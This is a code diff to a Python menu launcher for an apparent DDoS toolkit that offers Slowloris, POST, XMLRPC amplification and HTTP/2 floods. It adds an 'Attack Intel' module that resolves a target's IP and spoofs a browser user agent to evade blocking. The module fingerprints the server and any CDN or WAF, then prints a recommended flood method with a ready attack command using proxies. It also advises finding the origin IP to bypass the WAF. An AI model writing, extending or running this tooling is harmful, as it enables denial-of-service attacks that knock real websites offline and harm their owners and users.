@@ -36,10 +36,18 @@ def main():
     print(f"[{bcolors.OKCYAN}3{bcolors.RESET}] STRESS  - (High Load/Universal Stress Test)")
     print(f"[{bcolors.OKCYAN}4{bcolors.RESET}] XMLRPC  - (WordPress Amplification Method)")
     print(f"[{bcolors.OKCYAN}5{bcolors.RESET}] POST_DYN- (Phase 2: Non-Cacheable POST Flood)")
-    print(f"[{bcolors.OKCYAN}6{bcolors.RESET}] H2_FLOOD- (Phase 5: HTTP/2 Multiplexing - Fastest)")
+
+    
+    # [PHASE 17] Attack Intel Module
+    print(f"[{bcolors.OKCYAN}7{bcolors.RESET}] ATTACK INTEL (Origin Scan + Auto-Rec)")
     print("")
     
-    choice = input(f"{bcolors.BOLD}Choose Method (1-6): {bcolors.RESET}")
+    choice = input(f"{bcolors.BOLD}Choose Method (1-7): {bcolors.RESET}")
+    
+    if choice == "7":
+        run_intel()
+        sys.exit(0)
+
     methods = {"1": "SLOW", "2": "DYN", "3": "STRESS", "4": "XMLRPC", "5": "POST_DYN", "6": "H2_FLOOD"}
     method = methods.get(choice, "SLOW")
 
@@ -117,10 +125,105 @@ def main():
     
     try:
         subprocess.run(cmd)
-    except KeyboardInterrupt:
-        print(f"\n{bcolors.WARNING}Attack stopped by user.{bcolors.RESET}")
     except Exception as e:
         print(f"\n{bcolors.FAIL}Error: {e}{bcolors.RESET}")
+
+def run_intel():
+    clear()
+    banner()
+    print(f"{bcolors.HEADER}[ ATTACK INTEL & ORIGIN SCANNER ]{bcolors.RESET}")
+    target = input(f"Enter Target Domain (e.g. example.com): {bcolors.OKBLUE}").strip()
+    print(f"{bcolors.RESET}", end="")
+    
+    if "://" in target:
+        target_domain = target.split("://")[1].split("/")[0]
+        target_url = target
+    else:
+        target_domain = target.split("/")[0]
+        target_url = f"https://{target}"
+
+    print("-" * 40)
+    print(f"{bcolors.OKCYAN}Phase 1: DNS & Origin Resolution...{bcolors.RESET}")
+    
+    try:
+        import socket
+        resolved_ip = socket.gethostbyname(target_domain)
+        print(f"[*] DNS Resolved IP: {bcolors.BOLD}{resolved_ip}{bcolors.RESET}")
+    except Exception as e:
+        print(f"{bcolors.FAIL}[!] DNS Resolution Failed: {e}{bcolors.RESET}")
+        resolved_ip = None
+
+    print(f"\n{bcolors.OKCYAN}Phase 2: Technology & Security Analysis...{bcolors.RESET}")
+    try:
+        import requests
+        # Use a real browser UA to avoid instant blocks
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'}
+        try:
+            r = requests.head(target_url, headers=headers, timeout=5, verify=False)
+            server_header = r.headers.get('Server', 'Unknown')
+            powered_by = r.headers.get('X-Powered-By', 'Unknown')
+            via = r.headers.get('Via', '')
+            cdn_guess = "Unknown"
+            
+            # WAF/CDN Detection Heuristics
+            wafs = {
+                "cloudflare": "Cloudflare",
+                "akamai": "Akamai",
+                "fastly": "Fastly",
+                "imperva": "Imperva",
+                "incapsula": "Imperva",
+                "sucuri": "Sucuri"
+            }
+            
+            headers_str = str(r.headers).lower()
+            for key, name in wafs.items():
+                if key in headers_str:
+                    cdn_guess = name
+                    break
+            
+            print(f"[*] Server Header : {bcolors.OKGREEN}{server_header}{bcolors.RESET}")
+            print(f"[*] X-Powered-By  : {bcolors.OKGREEN}{powered_by}{bcolors.RESET}")
+            if cdn_guess != "Unknown":
+                print(f"[*] CDN/WAF       : {bcolors.FAIL}{cdn_guess} DETECTED!{bcolors.RESET}")
+            
+            # Phase 3: Recommendation Engine
+            print(f"\n{bcolors.OKCYAN}Phase 3: Tactical Recommendation{bcolors.RESET}")
+            recommended_method = "H2_FLOOD" # Default fallback
+            reason = "General High Throughput"
+            
+            if "Apache" in server_header:
+                recommended_method = "SLOW"
+                reason = "Apache is vulnerable to Slowloris (Thread Starvation)"
+            elif "nginx" in server_header.lower() or "cloudflare" in server_header.lower():
+                recommended_method = "H2_FLOOD"
+                reason = "Nginx/Cloudflare handles concurrency well, requires Multiplexing Flood"
+            elif "LiteSpeed" in server_header or "LiteSpeed" in powered_by:
+                recommended_method = "H2_FLOOD"
+                reason = "LiteSpeed is resilient, high volume H2 traffic needed"
+            
+            if resolved_ip and not cdn_guess == "Unknown":
+                 print(f"{bcolors.WARNING}[!] Warning: Target is behind {cdn_guess}.{bcolors.RESET}")
+                 print(f"    You should try to find the ORIGIN IP of the server.")
+                 print(f"    If you attack {resolved_ip} directly, you might bypass the WAF.")
+            
+            print(f"\n{bcolors.BOLD}>>> RECOMMENDED STRATEGY <<<{bcolors.RESET}")
+            print(f"Method : {bcolors.OKGREEN}{recommended_method}{bcolors.RESET}")
+            print(f"Reason : {reason}")
+            
+            if recommended_method == "SLOW":
+                 print(f"Command: {bcolors.OKBLUE}python3 start.py SLOW {target_url} 5 1000 proxy.txt 100 800{bcolors.RESET}")
+            else:
+                 print(f"Command: {bcolors.OKBLUE}python3 start.py {recommended_method} {target_url} 7 100 proxy.txt 50 800{bcolors.RESET}")
+
+        except Exception as e:
+             print(f"{bcolors.FAIL}[!] Header Analysis Failed: {e}{bcolors.RESET}")
+
+    except ImportError:
+        print(f"{bcolors.FAIL}[!] Missing dependencies! Run: pip install requests{bcolors.RESET}")
+
+    print("\nPress Enter to return to menu...")
+    input()
+    main()
 
 if __name__ == "__main__":
     main()
